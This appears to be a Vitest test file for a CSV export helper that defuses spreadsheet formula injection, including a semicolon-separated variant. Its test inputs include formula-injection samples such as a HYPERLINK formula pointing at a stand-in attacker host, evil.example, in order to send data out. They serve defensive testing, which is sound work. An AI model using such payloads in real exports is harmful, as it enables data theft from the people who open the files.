// Exports are opened in Excel. A cell that starts with a formula character used
// to run as a formula there, and names and emails arrive from public forms.

import { describe, it, expect } from 'vitest';
import { csvCell, toCsv } from './exportCsv';

describe('csvCell', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+cmd', "'+cmd"],
    ['-2+3', "'-2+3"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\t=1+1', "'\t=1+1"],
  ])('turns %j into text', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it('quotes a formula with commas after making it text', () => {
    expect(csvCell('=HYPERLINK("https://evil.example/?d=","Open")'))
      .toBe('"\'=HYPERLINK(""https://evil.example/?d="",""Open"")"');
  });

  it('quotes a value that starts with a carriage return', () => {
    expect(csvCell('\r=1+1')).toBe('"\'\r=1+1"');
  });

  it('leaves real numbers and ordinary text alone', () => {
    expect(csvCell(-5)).toBe('-5');
    expect(csvCell(42)).toBe('42');
    expect(csvCell('Jean Dupont')).toBe('Jean Dupont');
    expect(csvCell('a = b')).toBe('a = b');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('still quotes commas, quotes and line breaks', () => {
    expect(csvCell('Dupont, Jean')).toBe('"Dupont, Jean"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('two\nlines')).toBe('"two\nlines"');
  });
});

describe('toCsv', () => {
  it('guards every cell of every row', () => {
    const csv = toCsv(
      [{ name: '=HYPERLINK("https://evil.example","x")', score: -3 }],
      [
        { header: 'Name', value: (r) => r.name },
        { header: 'Score', value: (r) => r.score },
      ],
    );
    expect(csv).toBe('Name,Score\n"\'=HYPERLINK(""https://evil.example"",""x"")",-3');
  });
});

describe('a semicolon file, as Excel in Switzerland reads it', () => {
  const columns = [
    { header: 'Name', value: (r: { name: string; value: string }) => r.name },
    { header: 'Deal value', value: (r: { name: string; value: string }) => r.value },
  ];

  it('splits columns by semicolons and quotes a cell that holds one, but not one with a comma', () => {
    const csv = toCsv([{ name: 'Hotel Bellevue, Zermatt', value: 'CHF 40000; EUR 25000' }], columns, ';');
    expect(csv).toBe('Name;Deal value\nHotel Bellevue, Zermatt;"CHF 40000; EUR 25000"');
  });

  it('still turns formulas into text', () => {
    expect(csvCell('=1+1', ';')).toBe("'=1+1");
    expect(csvCell('=A1;B1', ';')).toBe('"\'=A1;B1"');
  });

  it('leaves the comma file as it always was', () => {
    const csv = toCsv([{ name: 'Hotel Bellevue, Zermatt', value: 'CHF 40000; EUR 25000' }], columns);
    expect(csv).toBe('Name,Deal value\n"Hotel Bellevue, Zermatt",CHF 40000; EUR 25000');
  });
});
